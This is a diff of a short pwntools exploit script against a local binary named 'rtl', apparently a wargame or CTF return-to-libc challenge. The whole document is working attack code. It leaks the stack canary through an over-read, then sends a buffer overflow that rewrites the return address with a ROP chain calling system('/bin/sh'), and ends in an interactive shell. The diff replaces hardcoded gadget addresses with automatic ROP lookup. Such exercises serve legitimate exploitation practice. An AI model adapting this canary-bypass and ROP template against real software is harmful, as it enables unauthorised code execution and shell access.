@@ -1,21 +1,26 @@
 from pwn import *
 
 p = process('./rtl')
-e = ELF('rtl')
-shell = 0x400874
+e = ELF('./rtl')
+rop = ROP('./rtl')
 
-buf = b"b"*0x39
-p.sendafter(b"Buf:", buf)
+#context.log_level = 'debug'
+
+buf = b"A"*0x39
+
+p.sendafter(b"Buf: ", buf);
 p.recvuntil(buf)
 cnry = u64(b'\x00' + p.recv(7))
+
 print(hex(cnry))
 
-buf = b"A"*0x38 + p64(cnry) + b"A"*0x8
-buf += p64(0x400285) # ret
-buf += p64(0x400853) # pop_rdi
-buf += p64(0x400874) # shell
+buf = b"A"*0x38 + p64(cnry) + b"B"*0x8
+buf += p64(rop.ret[0])
+buf += p64(rop.rdi[0])
+buf += p64(list(e.search(b"/bin/sh"))[0])
 buf += p64(e.plt['system'])
 
-p.sendafter(b"Buf: ", buf)
+
+p.sendafter(b"Buf: ", buf);
 
 p.interactive()
